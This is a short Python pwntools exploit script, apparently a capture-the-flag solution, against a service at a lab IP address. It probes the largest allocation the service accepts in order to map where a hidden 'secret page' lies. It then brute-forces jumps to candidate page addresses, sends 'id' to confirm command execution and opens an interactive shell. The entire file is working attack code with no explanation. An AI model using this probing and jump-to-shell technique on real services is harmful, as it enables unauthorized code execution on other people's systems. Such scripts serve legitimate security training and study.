#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.28"
port = 8888



def alloca(size):
    r.recvuntil(":")
    r.sendline("a")
    r.recvuntil("? ")
    r.sendline(str(size))
    data = r.recvuntil(" ")
    if "FAIL" in data :
        return False
    return True

def jmp(addr):
    r.recvuntil(":")
    r.sendline("j")
    r.recvuntil("? ")
    r.sendline(str(addr))


# Find the max size of malloc , it will fill the hold in front of secret page .

maxsize = 0x000000000000
for i in range(5,0,-1):
    size = maxsize
    for j in range(0xff):
        r = remote(host,port)
        size += 0x1 << 8*i
        result = alloca(size)
        if result :
            maxsize = size
        else :
            r.close()
            break
        r.close()

print "Max size : " , hex(maxsize)



# Try to jump secret page 

secretpage = maxsize & 0xfffffffff000

for i in range(256):
    r = remote(host,port)
    jmp(secretpage)
    print hex(secretpage)
    r.sendline("id")
    try :
        if r.recv(10):
            r.interactive()
            break
    except :
        secretpage += 0x1000
        r.close()

